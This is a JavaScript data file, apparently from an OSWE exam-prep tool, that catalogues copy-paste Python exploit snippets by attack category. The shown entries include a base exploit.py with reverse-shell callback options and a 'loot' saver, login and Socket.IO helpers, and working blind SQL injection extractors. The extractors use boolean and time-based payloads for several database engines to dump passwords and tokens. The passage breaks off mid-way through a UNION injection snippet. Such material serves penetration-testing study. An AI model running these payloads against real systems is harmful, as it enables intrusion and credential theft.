var CATEGORIES = ["All","Base","HTTP","Login","WebSocket","Token","SQLi","NoSQL/LDAP/XPath","File","XXE","SSRF","Upload","RCE","Deser","Node","Logic","XSS","CSRF","CORS","Proof","Helpers"];
var ENTRIES = [{"id":"base-exploit-py","title":"START - exploit.py base","category":"Base","kind":"base","functionName":"","call":"copy this first","summary":"Base minimo: args, session, proxy/debug/TLS, helpers, main vazio.","useWhen":"Comeca sempre por aqui. Cola funcoes por cima de main() e chama dentro de main().","editFirst":["main() calls"],"aliases":["argparse","requests.Session","--target","--proxy","--debug","cfg","session"],"code":"#!/usr/bin/python3\nimport argparse\nimport base64\nimport binascii\nimport json\nimport os\nimport re\nimport sys\nimport time\nfrom urllib.parse import quote, quote_plus, urljoin\n\nimport requests\n\ndef parse_args(add_extra=None):\n    p = argparse.ArgumentParser(description=\"OSWE exploit.py\")\n    p.add_argument(\"-t\", \"--target\", required=True, help=\"target base URL, e.g. http://host\")\n    p.add_argument(\"-u\", \"--username\", default=\"user\", help=\"username to use or attack\")\n    p.add_argument(\"-p\", \"--password\", default=\"pass\", help=\"password to use or set\")\n    p.add_argument(\"--lhost\", help=\"callback host/IP for OOB, file server, reverse shell\")\n    p.add_argument(\"--lport\", type=int, help=\"callback port for OOB, file server, reverse shell\")\n    p.add_argument(\"--server-host\", help=\"public host/IP victims can reach for XSS/OOB HTTP callbacks\")\n    p.add_argument(\"--server-port\", type=int, help=\"public HTTP callback/listener port for XSS/OOB\")\n    p.add_argument(\"--proxy\", help=\"optional proxy, e.g. http://127.0.0.1:8080\")\n    p.add_argument(\"--debug\", action=\"store_true\", help=\"print debug details\")\n    p.add_argument(\"--verify-tls\", action=\"store_true\", help=\"verify HTTPS certificates\")\n    p.add_argument(\"--timeout\", type=int, default=12, help=\"request timeout seconds\")\n    if add_extra:\n        add_extra(p)  # add challenge-specific args here\n    cfg = p.parse_args()\n    cfg.target = cfg.target.rstrip(\"/\")\n    return cfg\n\ndef build_session(cfg):\n    session = requests.Session()\n    session.verify = cfg.verify_tls\n    session.headers.update({\"User-Agent\": \"oswe-exploit/1.0\"})\n    if cfg.proxy:\n        session.proxies.update({\"http\": cfg.proxy, \"https\": cfg.proxy})\n    return session\n\ndef url(cfg, path):\n    return urljoin(cfg.target.rstrip(\"/\") + \"/\", path.lstrip(\"/\"))\n\ndef fail(msg):\n    print(f\"[-] {msg}\")\n    sys.exit(1)\n\ndef check(cond, msg):\n    if not cond:\n        fail(msg)\n\ndef debug(cfg, *parts):\n    if cfg.debug:\n        print(\"[debug]\", *parts)\n\ndef require_callback(cfg):\n    check(cfg.lhost and cfg.lport, \"this function needs --lhost and --lport\")\n\ndef callback_url(cfg, path=\"\", scheme=\"http\"):\n    require_callback(cfg)\n    return f\"{scheme}://{cfg.lhost}:{cfg.lport}/{path.lstrip('/')}\"\n\ndef require_server(cfg):\n    host = cfg.server_host or cfg.lhost\n    port = cfg.server_port or cfg.lport\n    check(host and port, \"this function needs --server-host and --server-port\")\n    return host, port\n\ndef server_url(cfg, path=\"\", scheme=\"http\"):\n    host, port = require_server(cfg)\n    return f\"{scheme}://{host}:{port}/{path.lstrip('/')}\"\n\ndef save_loot(name, data, mode=\"w\"):\n    os.makedirs(\"loot\", exist_ok=True)\n    path = os.path.join(\"loot\", name)\n    with open(path, mode, encoding=\"utf-8\", errors=\"ignore\") as f:\n        f.write(str(data))\n        if not str(data).endswith(\"\\n\"):\n            f.write(\"\\n\")\n    print(f\"[+] saved {path}\")\n    return path\n\ndef main():\n    cfg = parse_args()\n    session = build_session(cfg)\n    print(\"[*] target:\", cfg.target)\n\n    # 1. paste functions above main()\n    # 2. call them here, in order\n    # login_form(session, cfg)\n    # dump_boolean_sqli_http(session, cfg)\n    # proof_http_marker(session, cfg)\n\nif __name__ == \"__main__\":\n    main()\n"},{"id":"http-request-from-burp","title":"HTTP - request from Burp shape","category":"HTTP","kind":"function","functionName":"send_burp_style_request","call":"send_burp_style_request(session, cfg)","summary":"Replica um request visto no Burp com method/path/headers/body.","useWhen":"Tens um request manual a funcionar e queres passar para Python sem magia.","editFirst":["METHOD","PATH","HEADERS","DATA","JSON_BODY"],"aliases":["raw request","burp","headers","cookies","PUT","PATCH","Content-Type"],"code":"def send_burp_style_request(session, cfg):\n    METHOD = \"POST\"                       # EDIT GET/POST/PUT/PATCH/DELETE\n    PATH = \"/api/path\"                    # EDIT\n    HEADERS = {\"Content-Type\": \"application/json\"}  # EDIT\n    PARAMS = None                         # EDIT {\"id\": \"1\"}\n    DATA = None                           # EDIT \"a=1&b=2\" or dict\n    JSON_BODY = {\"name\": \"value\"}         # EDIT or None\n\n    r = session.request(\n        METHOD,\n        url(cfg, PATH),\n        params=PARAMS,\n        data=DATA,\n        json=JSON_BODY,\n        headers=HEADERS,\n        timeout=cfg.timeout,\n    )\n    debug(cfg, METHOD, r.url, r.status_code, r.text[:200])\n    return r\n"},{"id":"http-simple-get","title":"HTTP - simple GET","category":"HTTP","kind":"function","functionName":"simple_get","call":"r = simple_get(session, cfg)","summary":"Plain GET request with path, params and optional headers.","useWhen":"You just need to hit one endpoint and inspect status, length, time and body preview.","editFirst":["PATH","PARAMS","HEADERS"],"aliases":["GET","requests.get","status_code","length","elapsed","no auth"],"code":"def simple_get(session, cfg):\n    PATH = \"/\"                            # EDIT\n    PARAMS = None                         # EDIT e.g. {\"q\": \"test\"}\n    HEADERS = {}                          # EDIT optional\n\n    r = session.get(\n        url(cfg, PATH),\n        params=PARAMS,\n        headers=HEADERS,\n        timeout=cfg.timeout,\n    )\n    print(\"[GET]\", r.status_code, \"len\", len(r.text), \"time\", round(r.elapsed.total_seconds(), 3), r.url)\n    print(r.text[:500])\n    return r\n"},{"id":"http-simple-post","title":"HTTP - simple POST","category":"HTTP","kind":"function","functionName":"simple_post","call":"r = simple_post(session, cfg)","summary":"Plain POST request with form data or JSON body.","useWhen":"You need the smallest POST shape before adding auth, CSRF, files or exploit payloads.","editFirst":["PATH","DATA","JSON_BODY","HEADERS"],"aliases":["POST","requests.post","form","json","status_code","length","elapsed"],"code":"def simple_post(session, cfg):\n    PATH = \"/submit\"                      # EDIT\n    DATA = {}                             # EDIT form body, e.g. {\"username\": \"admin\"}\n    JSON_BODY = None                      # EDIT JSON body or keep None\n    HEADERS = {}                          # EDIT optional\n\n    r = session.post(\n        url(cfg, PATH),\n        data=DATA if JSON_BODY is None else None,\n        json=JSON_BODY,\n        headers=HEADERS,\n        timeout=cfg.timeout,\n    )\n    print(\"[POST]\", r.status_code, \"len\", len(r.text), \"time\", round(r.elapsed.total_seconds(), 3), r.url)\n    print(r.text[:500])\n    return r\n"},{"id":"login-form-basic","title":"Login - normal form","category":"Login","kind":"function","functionName":"login_form","call":"login_form(session, cfg)","summary":"GET/POST simples com username/password. Cookies ficam automaticamente na session.","useWhen":"Burp mostra username/password em body POST ou query string GET.","editFirst":["METHOD","LOGIN_PATH","USER_FIELD","PASS_FIELD","SUCCESS_TEXT","EXTRA_DATA"],"aliases":["j_security_check","JSESSIONID","cookie","form login","username","password","GET login","POST login"],"code":"def login_form(session, cfg):\n    METHOD = \"POST\"                       # EDIT POST or GET\n    LOGIN_PATH = \"/login\"                 # EDIT e.g. /opencrx-core-CRX/j_security_check\n    PRE_LOGIN_PATH = \"\"                   # EDIT optional GET first\n    USER_FIELD = \"username\"               # EDIT field name, not value\n    PASS_FIELD = \"password\"               # EDIT field name, not value\n    SUCCESS_TEXT = \"Logout\"               # EDIT set \"\" if status/redirect is enough\n    EXTRA_DATA = None                     # EDIT dict only, e.g. {\"p\": \"CRX\", \"s\": \"Standard\"}\n\n    if PRE_LOGIN_PATH:\n        session.get(url(cfg, PRE_LOGIN_PATH), timeout=cfg.timeout)\n\n    check(EXTRA_DATA is None or isinstance(EXTRA_DATA, dict), \"EXTRA_DATA must be None or dict\")\n    data = dict(EXTRA_DATA or {})\n    data[USER_FIELD] = cfg.username\n    data[PASS_FIELD] = cfg.password\n\n    if METHOD.upper() == \"GET\":\n        r = session.get(url(cfg, LOGIN_PATH), params=data, allow_redirects=True, timeout=cfg.timeout)\n    else:\n        r = session.post(url(cfg, LOGIN_PATH), data=data, allow_redirects=True, timeout=cfg.timeout)\n\n    debug(cfg, \"login status\", r.status_code, r.url, \"cookies\", session.cookies.get_dict())\n    check((not SUCCESS_TEXT) or SUCCESS_TEXT in r.text or r.status_code in (200, 302), \"login failed\")\n    print(\"[+] logged in\")\n    return True\n"},{"id":"login-form-csrf","title":"Login - form with CSRF","category":"Login","kind":"function","functionName":"login_form_csrf","call":"login_form_csrf(session, cfg)","summary":"GET login page, extrai token CSRF, POST login com token.","useWhen":"O form tem hidden input/token antes do POST.","editFirst":["LOGIN_PAGE","LOGIN_POST","TOKEN_REGEX","TOKEN_FIELD","USER_FIELD","PASS_FIELD"],"aliases":["csrf","csrfmiddlewaretoken","_token","hidden input","form login"],"code":"def login_form_csrf(session, cfg):\n    LOGIN_PAGE = \"/login\"                 # EDIT page that contains CSRF token\n    LOGIN_POST = \"/login\"                 # EDIT POST endpoint\n    TOKEN_REGEX = r'name=\"csrfmiddlewaretoken\" value=\"([^\"]+)\"'  # EDIT\n    TOKEN_FIELD = \"csrfmiddlewaretoken\"   # EDIT\n    USER_FIELD = \"username\"               # EDIT\n    PASS_FIELD = \"password\"               # EDIT\n    SUCCESS_TEXT = \"Logout\"               # EDIT\n\n    r = session.get(url(cfg, LOGIN_PAGE), timeout=cfg.timeout)\n    m = re.search(TOKEN_REGEX, r.text)\n    check(m, \"CSRF token not found\")\n\n    data = {\n        USER_FIELD: cfg.username,\n        PASS_FIELD: cfg.password,\n        TOKEN_FIELD: m.group(1),\n    }\n    r = session.post(url(cfg, LOGIN_POST), data=data, allow_redirects=True, timeout=cfg.timeout)\n    debug(cfg, \"login csrf\", r.status_code, r.url, session.cookies.get_dict())\n    check((not SUCCESS_TEXT) or SUCCESS_TEXT in r.text or r.status_code in (200, 302), \"login failed\")\n    print(\"[+] logged in with csrf\")\n    return True\n"},{"id":"login-json-token","title":"Login - JSON token","category":"Login","kind":"function","functionName":"login_json_token","call":"auth = login_json_token(session, cfg)","summary":"POST JSON login, extrai token, aplica Authorization/cookie na session.","useWhen":"API devolve token em JSON depois do login.","editFirst":["LOGIN_PATH","JSON_BODY","TOKEN_PATH","AUTH_OUTPUT","COOKIE_NAME"],"aliases":["bearer","jwt","accessToken","Authorization","json login","token"],"code":"def login_json_token(session, cfg):\n    LOGIN_PATH = \"/api/login\"             # EDIT\n    JSON_BODY = {\"email\": cfg.username, \"password\": cfg.password}  # EDIT\n    TOKEN_PATH = (\"token\",)               # EDIT e.g. (\"data\", \"accessToken\")\n    HEADER_SCHEME = \"Bearer\"              # EDIT\n    AUTH_OUTPUT = \"header\"                # EDIT header | cookie | both\n    COOKIE_NAME = \"token\"                 # EDIT if cookie/both\n\n    r = session.post(url(cfg, LOGIN_PATH), json=JSON_BODY, timeout=cfg.timeout)\n    debug(cfg, \"json login\", r.status_code, r.text[:250])\n    check(r.status_code in (200, 201), \"login bad status\")\n    data = r.json()\n    token = data\n    for key in TOKEN_PATH:\n        token = token.get(key) if isinstance(token, dict) else None\n    check(token, \"token missing\")\n\n    auth = {\"headers\": {}, \"cookies\": {}}\n    if AUTH_OUTPUT in (\"header\", \"both\"):\n        session.headers.update({\"Authorization\": f\"{HEADER_SCHEME} {token}\"})\n        auth[\"headers\"][\"Authorization\"] = f\"{HEADER_SCHEME} {token}\"\n    if AUTH_OUTPUT in (\"cookie\", \"both\"):\n        session.cookies.set(COOKIE_NAME, token)\n        auth[\"cookies\"][COOKIE_NAME] = token\n    print(\"[+] token ready\")\n    return auth\n"},{"id":"auth-static-cookie-header","title":"Login - static cookie/header","category":"Login","kind":"function","functionName":"set_static_auth","call":"set_static_auth(session, cfg)","summary":"Cola cookie ou header manual do Burp para todos os pedidos seguintes.","useWhen":"Ja tens JSESSIONID/token/cookie e queres que todos os requests usem isso.","editFirst":["COOKIES","HEADERS"],"aliases":["Cookie","JSESSIONID","Authorization","Bearer","manual auth"],"code":"def set_static_auth(session, cfg):\n    COOKIES = {\"JSESSIONID\": \"PASTE_VALUE\"}        # EDIT or {}\n    HEADERS = {\"Authorization\": \"Bearer PASTE\"}    # EDIT or {}\n\n    for name, value in COOKIES.items():\n        session.cookies.set(name, value)\n    session.headers.update(HEADERS)\n    debug(cfg, \"cookies\", session.cookies.get_dict(), \"headers\", HEADERS)\n    print(\"[+] static auth applied\")\n    return {\"cookies\": COOKIES, \"headers\": HEADERS}\n"},{"id":"socketio-polling-event","title":"Socket.IO - polling event request","category":"WebSocket","kind":"function","functionName":"socketio_polling_event","call":"raw = socketio_polling_event(session, cfg, 'eventName', {'x': 'y'})","summary":"Socket.IO polling EIO=3/4 sem biblioteca extra. Faz open, connect e envia event.","useWhen":"Burp mostra /socket.io/?EIO=4&transport=polling e frames 42[\"event\", {...}].","editFirst":["PATH","EIO","NAMESPACE"],"aliases":["socket.io","EIO=4","EIO=3","transport=polling","42[","postLogin","checkEmail"],"code":"def socketio_polling_event(session, cfg, event_name, payload):\n    PATH = \"/socket.io/\"                  # EDIT\n    EIO = 4                               # EDIT 3 or 4\n    NAMESPACE = \"\"                        # EDIT \"\" or \"/admin\"\n\n    base = f\"{PATH}?EIO={EIO}&transport=polling\"\n    r = session.get(url(cfg, base), timeout=cfg.timeout)\n    debug(cfg, \"[socket.io open]\", r.text[:200])\n    check(r.text.startswith(\"0\"), \"Socket.IO open failed\")\n    sid = json.loads(r.text[1:])[\"sid\"]\n\n    ns = NAMESPACE\n    connect_packet = \"40\" + (ns + \",\" if ns else \"\")\n    r = session.post(url(cfg, f\"{PATH}?EIO={EIO}&transport=polling&sid={quote(sid)}\"),\n                     data=connect_packet, timeout=cfg.timeout)\n    debug(cfg, \"[socket.io connect]\", r.text[:200])\n\n    packet = \"42\" + (ns + \",\" if ns else \"\") + json.dumps([event_name, payload], separators=(\",\", \":\"))\n    r = session.post(url(cfg, f\"{PATH}?EIO={EIO}&transport=polling&sid={quote(sid)}\"),\n                     data=packet, timeout=cfg.timeout)\n    debug(cfg, \"[socket.io send]\", packet, r.text[:300])\n\n    r = session.get(url(cfg, f\"{PATH}?EIO={EIO}&transport=polling&sid={quote(sid)}\"),\n                    timeout=cfg.timeout)\n    debug(cfg, \"[socket.io recv]\", r.text[:500])\n    return r.text\n"},{"id":"login-socketio-token","title":"Socket.IO - login token","category":"WebSocket","kind":"function","functionName":"login_socketio_token","call":"auth = login_socketio_token(session, cfg)","summary":"Faz login via Socket.IO event e guarda token em header/cookie.","useWhen":"Exemplo: 42[\"postLogin\",{\"email\":\"test@test.com\",\"password\":\"test\"}].","editFirst":["EVENT_NAME","PAYLOAD","TOKEN_PATH","AUTH_OUTPUT"],"aliases":["socket.io login","postLogin","checkEmail","token","42[\"postLogin\""],"code":"def login_socketio_token(session, cfg):\n    EVENT_NAME = \"postLogin\"              # EDIT exact event name from Burp\n    PAYLOAD = {\"email\": cfg.username, \"password\": cfg.password}  # EDIT\n    TOKEN_PATH = (\"token\",)               # EDIT e.g. (\"user\", \"token\")\n    AUTH_OUTPUT = \"header\"                # EDIT header | cookie | both\n    COOKIE_NAME = \"token\"                 # EDIT if cookie/both\n\n    def sio_event(event_name, payload):\n        path = \"/socket.io/\"               # EDIT\n        eio = 4                            # EDIT 3 or 4\n        r = session.get(url(cfg, f\"{path}?EIO={eio}&transport=polling\"), timeout=cfg.timeout)\n        check(r.text.startswith(\"0\"), \"Socket.IO open failed\")\n        sid = json.loads(r.text[1:])[\"sid\"]\n        session.post(url(cfg, f\"{path}?EIO={eio}&transport=polling&sid={quote(sid)}\"), data=\"40\", timeout=cfg.timeout)\n        packet = \"42\" + json.dumps([event_name, payload], separators=(\",\", \":\"))\n        session.post(url(cfg, f\"{path}?EIO={eio}&transport=polling&sid={quote(sid)}\"), data=packet, timeout=cfg.timeout)\n        rr = session.get(url(cfg, f\"{path}?EIO={eio}&transport=polling&sid={quote(sid)}\"), timeout=cfg.timeout)\n        return rr.text\n\n    raw = sio_event(EVENT_NAME, PAYLOAD)\n    m = re.search(r'42(?:/[^,]+,)?(\\[.*\\])', raw)\n    check(m, \"Socket.IO event response missing\")\n    data = json.loads(m.group(1))\n    obj = data[1] if isinstance(data, list) and len(data) > 1 else data\n    token = obj\n    for key in TOKEN_PATH:\n        token = token.get(key) if isinstance(token, dict) else None\n    check(token, \"Socket.IO login token missing\")\n\n    if AUTH_OUTPUT in (\"header\", \"both\"):\n        session.headers.update({\"Authorization\": f\"Bearer {token}\"})\n    if AUTH_OUTPUT in (\"cookie\", \"both\"):\n        session.cookies.set(COOKIE_NAME, token)\n    print(\"[+] Socket.IO auth token ready\")\n    return {\"token\": token}\n"},{"id":"boolean-sqli-http","title":"SQLi - boolean extractor HTTP","category":"SQLi","kind":"function","functionName":"dump_boolean_sqli_http","call":"dump_boolean_sqli_http(session, cfg)","summary":"Oracle true/false com busca binaria por comprimento e chars.","useWhen":"Pagina muda quando a query e true/false.","editFirst":["PATH","PARAM","TARGET_VALUE","TRUE_MARKER","INJECTION","SUBQUERY","LENGTH_EXPR","CHAR_EXPR"],"aliases":["boolean","blind sqli","ASCII","UNICODE","SUBSTRING","SUBSTR","LENGTH","LEN","sqlite","BETWEEN","oracle"],"code":"def dump_boolean_sqli_http(session, cfg):\n    PATH = \"/api/check\"                   # EDIT\n    PARAM = \"u\"                           # EDIT vulnerable parameter\n    TARGET_VALUE = \"admin\"                # EDIT value before injection\n    TRUE_MARKER = \"taken\"                 # EDIT marker in response when true\n    INJECTION = \"{target}' AND ({q})-- -\" # EDIT\n    SUBQUERY = \"(SELECT password FROM users WHERE username='admin')\"  # EDIT scalar value to dump\n    LENGTH_EXPR = \"LENGTH({sub})={n}\"      # EDIT DBMS: LEN({sub}) for MSSQL\n    CHAR_EXPR = \"ASCII(SUBSTRING({sub},{i},1)) BETWEEN {lo} AND {mid}\"  # EDIT DBMS\n    # SQLite example: UNICODE(SUBSTR({sub},{i},1)) BETWEEN {lo} AND {mid}\n    MAX_LEN = 80                          # EDIT\n\n    def oracle(q):\n        payload = INJECTION.format(target=TARGET_VALUE, q=q)\n        r = session.get(url(cfg, PATH), params={PARAM: payload}, timeout=cfg.timeout)\n        debug(cfg, \"oracle\", q, r.status_code, r.text[:120])\n        return TRUE_MARKER in r.text\n\n    length = 0\n    for n in range(1, MAX_LEN + 1):\n        if oracle(LENGTH_EXPR.format(sub=SUBQUERY, n=n)):\n            length = n\n            break\n    check(length, \"length not found\")\n\n    out = \"\"\n    for i in range(1, length + 1):\n        lo, hi = 32, 126\n        while lo <= hi:\n            mid = (lo + hi) // 2\n            if oracle(CHAR_EXPR.format(sub=SUBQUERY, i=i, lo=lo, mid=mid)):\n                hi = mid - 1\n            else:\n                lo = mid + 1\n        out += chr(lo)\n        print(\"[partial]\", out)\n    return save_loot(\"boolean_sqli.txt\", out)\n"},{"id":"boolean-sqli-socketio","title":"SQLi - boolean extractor Socket.IO","category":"SQLi","kind":"function","functionName":"dump_boolean_sqli_socketio","call":"dump_boolean_sqli_socketio(session, cfg)","summary":"Mesmo extractor boolean, mas payload entra num Socket.IO event.","useWhen":"O sink vulneravel e algo tipo 42[\"checkEmail\",{\"token\":\"...\",\"email\":\"test'-- -\"}].","editFirst":["EVENT_NAME","PAYLOAD_TEMPLATE","PAYLOAD_FIELD","TRUE_MARKER","SUBQUERY","LENGTH_EXPR","CHAR_EXPR"],"aliases":["socket.io sqli","checkEmail","Socket.IO","MySQL","MSSQL","SQLite","boolean oracle"],"code":"def dump_boolean_sqli_socketio(session, cfg):\n    EVENT_NAME = \"checkEmail\"             # EDIT\n    PAYLOAD_TEMPLATE = {\"token\": \"PASTE_TOKEN\", \"email\": \"__PAYLOAD__\"}  # EDIT\n    PAYLOAD_FIELD = \"email\"               # EDIT\n    TRUE_MARKER = \"exists\"                # EDIT marker in raw response\n    INJECTION = \"test' AND ({q})-- -\"      # EDIT\n    SUBQUERY = \"(SELECT token FROM auth_tokens WHERE id=1)\"  # EDIT scalar value to dump\n    LENGTH_EXPR = \"LENGTH({sub})={n}\"      # EDIT DBMS\n    CHAR_EXPR = \"ASCII(SUBSTRING({sub},{i},1)) BETWEEN {lo} AND {mid}\"  # EDIT DBMS\n    # SQLite example: UNICODE(SUBSTR({sub},{i},1)) BETWEEN {lo} AND {mid}\n    MAX_LEN = 120                         # EDIT\n\n    def sio_event(event_name, payload):\n        path = \"/socket.io/\"               # EDIT\n        eio = 4                            # EDIT 3 or 4\n        r = session.get(url(cfg, f\"{path}?EIO={eio}&transport=polling\"), timeout=cfg.timeout)\n        check(r.text.startswith(\"0\"), \"Socket.IO open failed\")\n        sid = json.loads(r.text[1:])[\"sid\"]\n        session.post(url(cfg, f\"{path}?EIO={eio}&transport=polling&sid={quote(sid)}\"), data=\"40\", timeout=cfg.timeout)\n        packet = \"42\" + json.dumps([event_name, payload], separators=(\",\", \":\"))\n        session.post(url(cfg, f\"{path}?EIO={eio}&transport=polling&sid={quote(sid)}\"), data=packet, timeout=cfg.timeout)\n        rr = session.get(url(cfg, f\"{path}?EIO={eio}&transport=polling&sid={quote(sid)}\"), timeout=cfg.timeout)\n        return rr.text\n\n    def oracle(q):\n        payload = dict(PAYLOAD_TEMPLATE)\n        payload[PAYLOAD_FIELD] = INJECTION.format(q=q)\n        raw = sio_event(EVENT_NAME, payload)\n        debug(cfg, \"socketio oracle\", q, raw[:180])\n        return TRUE_MARKER in raw\n\n    length = 0\n    for n in range(1, MAX_LEN + 1):\n        q = LENGTH_EXPR.format(sub=SUBQUERY, n=n)\n        if oracle(q):\n            length = n\n            break\n    check(length, \"length not found\")\n\n    out = \"\"\n    for i in range(1, length + 1):\n        lo, hi = 32, 126\n        while lo <= hi:\n            mid = (lo + hi) // 2\n            q = CHAR_EXPR.format(sub=SUBQUERY, i=i, lo=lo, mid=mid)\n            if oracle(q):\n                hi = mid - 1\n            else:\n                lo = mid + 1\n        out += chr(lo)\n        print(\"[partial]\", out)\n    return save_loot(\"socketio_boolean_sqli.txt\", out)\n"},{"id":"time-sqli-http","title":"SQLi - time extractor HTTP","category":"SQLi","kind":"function","functionName":"dump_time_sqli_http","call":"dump_time_sqli_http(session, cfg)","summary":"Time-based extractor with binary length search and charset reduction.","useWhen":"Nada muda visualmente, mas true faz delay. Escolhe DBMS profile e edita o SUBQUERY.","editFirst":["DBMS","PATH","METHOD","PARAM","SUBQUERY","DELAY_SECONDS","CHARSET"],"aliases":["time based","blind","oracle","pg_sleep","SLEEP(","WAITFOR","benchmark","DBMS_LOCK.SLEEP","mysql","mariadb","postgres","postgresql","mssql","sql server","oracle","h2","CHARINDEX","INSTR","LOCATE","POSITION","CHR","NCHAR"],"code":"def dump_time_sqli_http(session, cfg):\n    PATH = \"/api/search\"                  # EDIT injectable path\n    METHOD = \"POST\"                       # EDIT GET/POST\n    PARAM = \"q\"                           # EDIT injectable field\n    IN_QUERY = False                      # EDIT True puts payload in query string\n    EXTRA = {}                            # EDIT fixed fields, e.g. {\"mod\": \"1\"}\n    HEADERS = {\"Content-Type\": \"application/x-www-form-urlencoded\"}  # EDIT\n\n    DBMS = \"postgres\"                     # EDIT postgres | mysql | mssql | oracle | h2 | custom\n    DELAY_SECONDS = 5                     # EDIT pg_sleep/SLEEP/WAITFOR delay\n    THRESHOLD = 1.5                       # EDIT seconds over baseline\n    TIMEOUT_PAD = 5                       # EDIT timeout = cfg.timeout + delay + pad\n\n    SUBQUERY = \"\"                         # EDIT scalar value to extract; blank uses profile example\n    MAX_LEN = 128                         # EDIT upper bound\n    CHARSET = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=_-{}@.:\"\n\n    DB_PROFILES = {\n        \"postgres\": {\n            \"subquery\": \"(SELECT current_database())\",\n            \"payload\": \"x' OR (SELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END) IS NULL-- -\",\n            \"length_gt\": \"LENGTH({sub}) > {mid}\",\n            \"present\": \"POSITION(CHR({ordc}) IN {sub}) > 0\",\n            \"char_eq\": \"SUBSTRING({sub} FROM {pos} FOR 1) = CHR({ordc})\",\n        },\n        \"mysql\": {\n            \"subquery\": \"(SELECT DATABASE())\",\n            \"payload\": \"x' OR IF(({cond}), SLEEP({delay}), 0)-- -\",\n            \"length_gt\": \"CHAR_LENGTH({sub}) > {mid}\",\n            \"present\": \"INSTR({sub}, CHAR({ordc})) > 0\",\n            \"char_eq\": \"SUBSTRING({sub},{pos},1) = CHAR({ordc})\",\n        },\n        \"mariadb\": {\n            \"subquery\": \"(SELECT DATABASE())\",\n            \"payload\": \"x' OR IF(({cond}), SLEEP({delay}), 0)-- -\",\n            \"length_gt\": \"CHAR_LENGTH({sub}) > {mid}\",\n            \"present\": \"INSTR({sub}, CHAR({ordc})) > 0\",\n            \"char_eq\": \"SUBSTRING({sub},{pos},1) = CHAR({ordc})\",\n        },\n        \"mssql\": {\n            \"subquery\": \"(SELECT DB_NAME())\",\n            \"payload\": \"x'; IF ({cond}) WAITFOR DELAY '00:00:{delay}'--\",\n            \"length_gt\": \"LEN({sub}) > {mid}\",\n            \"present\": \"CHARINDEX(NCHAR({ordc}), {sub}) > 0\",\n            \"char_eq\": \"SUBSTRING({sub},{pos},1) = NCHAR({ordc})\",\n        },\n        \"oracle\": {\n            \"subquery\": \"(SELECT USER FROM dual)\",\n            \"payload\": \"x'; BEGIN IF ({cond}) THEN DBMS_LOCK.SLEEP({delay}); END IF; END;--\",\n            \"length_gt\": \"LENGTH({sub}) > {mid}\",\n            \"present\": \"INSTR({sub}, CHR({ordc})) > 0\",\n            \"char_eq\": \"SUBSTR({sub},{pos},1) = CHR({ordc})\",\n        },\n        \"h2\": {\n            \"subquery\": \"(SELECT DATABASE())\",\n            \"payload\": \"x' OR CASE WHEN ({cond}) THEN SLEEP({delay}) ELSE 0 END=0-- -\",\n            \"length_gt\": \"LENGTH({sub}) > {mid}\",\n            \"present\": \"LOCATE(CHAR({ordc}), {sub}) > 0\",\n            \"char_eq\": \"SUBSTRING({sub} FROM {pos} FOR 1) = CHAR({ordc})\",\n        },\n        \"custom\": {\n            \"subquery\": \"(SELECT version())\",  # EDIT\n            \"payload\": \"x' OR IF(({cond}), SLEEP({delay}), 0)-- -\",  # EDIT wrapper/delay\n            \"length_gt\": \"LENGTH({sub}) > {mid}\",  # EDIT\n            \"present\": \"INSTR({sub}, CHAR({ordc})) > 0\",  # EDIT\n            \"char_eq\": \"SUBSTRING({sub},{pos},1) = CHAR({ordc})\",  # EDIT\n        },\n    }\n\n    profile = DB_PROFILES.get(DBMS.lower())\n    check(profile, \"bad DBMS profile\")\n    sub = SUBQUERY or profile[\"subquery\"]\n\n    def request_payload(payload):\n        values = dict(EXTRA)\n        values[PARAM] = payload\n        kwargs = {\n            \"headers\": HEADERS,\n            \"timeout\": cfg.timeout + DELAY_SECONDS + TIMEOUT_PAD,\n        }\n        if METHOD.upper() == \"GET\" or IN_QUERY:\n            kwargs[\"params\"] = values\n        else:\n            kwargs[\"data\"] = values\n        return session.request(METHOD.upper(), url(cfg, PATH), **kwargs)\n\n    def timed_condition(condition):\n        payload = profile[\"payload\"].format(cond=condition, delay=DELAY_SECONDS)\n        start = time.time()\n        try:\n            request_payload(payload)\n        except requests.exceptions.Timeout:\n            return True, time.time() - start\n        elapsed = time.time() - start\n        return False, elapsed\n\n    _, baseline = timed_condition(\"1=2\")\n    threshold = max(DELAY_SECONDS - 1, baseline + THRESHOLD)\n    debug(cfg, \"baseline\", baseline, \"threshold\", threshold)\n\n    def oracle(condition):\n        timed_out, elapsed = timed_condition(condition)\n        hit = timed_out or elapsed >= threshold\n        debug(cfg, \"time oracle\", condition, elapsed, hit)\n        return hit\n\n    print(\"[*] dumping:\", sub)\n    print(\"[*] length binary search...\")\n    lo, hi = 0, MAX_LEN\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if oracle(profile[\"length_gt\"].format(sub=sub, mid=mid)):\n            lo = mid + 1\n        else:\n            hi = mid\n    length = lo\n    check(length, \"length not found\")\n\n    print(\"[*] length:\", length)\n    print(\"[*] reducing charset...\")\n    present = []\n    for ch in CHARSET:\n        if oracle(profile[\"present\"].format(sub=sub, ordc=ord(ch), ch=ch.replace(\"'\", \"''\"))):\n            present.append(ch)\n            print(\"[charset]\", \"\".join(present))\n    active_charset = present or list(CHARSET)\n    if not present:\n        print(\"[!] charset reduction found nothing; using full CHARSET\")\n\n    out = \"\"\n    print(\"[*] extracting chars...\")\n    for pos in range(1, length + 1):\n        found = False\n        for ch in active_charset:\n            condition = profile[\"char_eq\"].format(sub=sub, pos=pos, ordc=ord(ch), ch=ch.replace(\"'\", \"''\"))\n            if oracle(condition):\n                out += ch\n                found = True\n                break\n        if not found:\n            out += \"?\"\n        print(\"[partial]\", out)\n\n    return save_loot(\"time_sqli.txt\", out)\n"},{"id":"union-marker-dump","title":"SQLi - UNION marker dump","category":"SQLi","kind":"function","functionName":"dump_union_marker","call":"dump_union_marker(session, cfg)","summary":"Extrai output visivel com marcador OSWE:...:EWSO.","useWhen":"A resposta mostra resultado de UNION/concat.","editFirst":["PATH","PARAM","PAYLOAD","MARKER_REGEX"],"aliases":["union","visible","concat","OSWE","EWSO"],"code":"def dump_union_marker(session, cfg):\n    PATH = \"/search\"                      # EDIT\n    PARAM = \"q\"                           # EDIT\n    PAYLOAD = \"' UNION SELECT CONCAT('OSWE:', database(), ':EWSO')-- -\"  # EDIT\n    MARKER_REGEX = r\"OSWE:(.*?):EWSO\"     # clean marker, no fake spaces\n\n    r = session.get(url(cfg, PATH), params={PARAM: PAYLOAD}, 